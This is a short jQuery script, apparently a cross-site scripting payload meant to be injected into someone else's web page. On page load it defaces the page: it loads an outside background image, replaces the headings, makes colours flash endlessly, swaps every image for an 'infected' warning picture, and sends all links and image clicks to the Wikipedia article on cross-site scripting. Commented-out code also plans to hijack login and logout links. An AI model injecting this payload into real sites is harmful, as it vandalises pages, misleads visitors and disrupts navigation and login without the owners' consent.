 
//I'm not sorry
function spasm()
{
    if($("p, h2, h3, h4, h5, h6, a").css("color") != "rgb(255, 0, 0)")
        $("p, h2, h3, h4, h5, h6, a").css("color", "rgb(255, 0, 0)");
    else
        $("p, h2, h3, h4, h5, h6, a").css("color", "rgb(0, 255, 0)");
     
    $("div").each(function(){
        var aa = ["white", "turquoise", "red", "green", "blue", "orange", "yellow"];
        var hue = aa[Math.floor(Math.random() * aa.length)];
        $(this).css("background-color", hue);
    });
    setTimeout(spasm, 100);
}
function init_fuckup()
{
    $("body").css("background-image", 'url("http://i.imgur.com/tMIZH4e.jpg")');
    $("body").css("background-repeat", "repeat");
    $("h1").text("SURPRISE BOAT SAILS!");
    $("h2").text("SURPRISE BOAT SAILS!");
    spasm();
}
 
$("document").ready(function(){
    //var isLoggedIn = false;
    init_fuckup();
    //Let's redirect some login links
    $("a").each(function(){
        /*console.log($(this).text());
        if($(this).text().match(/log *in/i))
            $(this).attr("href", "http://i.imgur.com/U53xG60.gifv");
        else if($(this).text().match(/register|sign *up/i))
            $(this).attr("href", "");
        else if($(this).attr("href").match(/index\./i))
            $(this).attr("href", "https://en.wikipedia.org/wiki/Cross-site_scripting");
        else if($(this).text().match(/log *out/i))
            $(this).attr("href", "https://reddit.com/r/itsaunixsystem"); isLoggedIn = true; //There is a log out link, so let's assume the person is logged in*/
        $(this).attr("href", "https://en.wikipedia.org/wiki/Cross-site_scripting");
    });
     
    $("img").each(function(){
        $(this).attr("src", "http://d2oah9q9xdinv5.cloudfront.net/images/articles/1/153/152446/1Infected-Warning-Sign.jpg");
    });
     
    $("img").click(function(){
        window.location.href = "https://en.wikipedia.org/wiki/Cross-site_scripting";
    });
});
